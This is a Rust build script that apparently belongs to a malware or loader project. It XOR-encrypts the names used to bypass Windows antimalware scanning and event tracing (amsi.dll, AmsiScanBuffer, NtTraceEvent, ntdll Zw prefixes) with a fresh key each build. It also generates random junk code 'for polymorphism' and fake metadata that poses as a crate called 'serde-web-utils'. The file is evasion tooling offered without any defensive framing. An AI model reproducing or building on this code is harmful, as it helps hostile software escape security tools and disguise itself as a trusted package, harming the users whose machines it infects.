use std::env;
use std::fs;
use std::path::Path;
use std::time::{SystemTime, UNIX_EPOCH};

fn main() {
    // gen random key based on time
    let start = SystemTime::now();
    let since_the_epoch = start
        .duration_since(UNIX_EPOCH)
        .expect("Time went backwards");
    let seed = since_the_epoch.as_nanos();
    
    // simple LCG for determinism, but we want random
    let mut key = Vec::new();
    let key_len = 8 + (seed % 8) as usize; // 8-15 bytes
    let mut state = seed;
    for _ in 0..key_len {
        state = state.wrapping_mul(6364136223846793005).wrapping_add(1442695040888963407);
        key.push((state >> 32) as u8);
    }

    // strings to encrypt
    let strings = vec![
        ("AMSI_DLL", "amsi.dll"),
        ("AMSI_SCAN", "AmsiScanBuffer"),
        ("NTDLL_DLL", "ntdll.dll"),
        ("NT_TRACE", "NtTraceEvent"),
        ("ZW_PREFIX", "Zw"),
    ];

    let mut output = String::new();
    output.push_str("// Generated by build.rs\n");
    output.push_str("pub mod constants {\n");
    
    // write Key
    output.push_str(&format!("    pub const XOR_KEY: &[u8] = &{:?};\n", key));

    // encrypt and Write Strings
    for (name, s) in strings {
        let encrypted: Vec<u8> = s.bytes()
            .enumerate()
            .map(|(i, b)| b ^ key[i % key.len()])
            .collect();
        output.push_str(&format!("    pub const {}_ENC: &[u8] = &{:?};\n", name, encrypted));
    }
    output.push_str("}\n");

    let out_dir = env::var_os("OUT_DIR").unwrap();
    let dest_path = Path::new(&out_dir).join("crypto_constants.rs");
    fs::write(&dest_path, output).unwrap();

    // gen random junk for polymorphism
    let mut poly = String::new();
    poly.push_str("pub mod poly {\n");
    poly.push_str("    pub fn random_logic() {\n");
    
    // random calculations
    let mut x = state;
    for _ in 0..10 {
        x = x.wrapping_mul(48271) % 2147483647;
        poly.push_str(&format!("        let _x{} = {};\n", x, x));
    }
    
    // fake metadata
    poly.push_str("        let _version = \"2.4.1\";\n");
    poly.push_str("        let _author = \"serde-web-utils\";\n");
    poly.push_str("    }\n");
    
    // fake Struct
    poly.push_str("    pub struct MetricConfig {\n");
    poly.push_str("        pub endpoint: &'static str,\n");
    poly.push_str("        pub retries: u32,\n");
    poly.push_str("    }\n");
    
    poly.push_str("}\n");

    let poly_path = Path::new(&out_dir).join("poly_generated.rs");
    fs::write(&poly_path, poly).unwrap();

    println!("cargo:rerun-if-changed=build.rs");
}

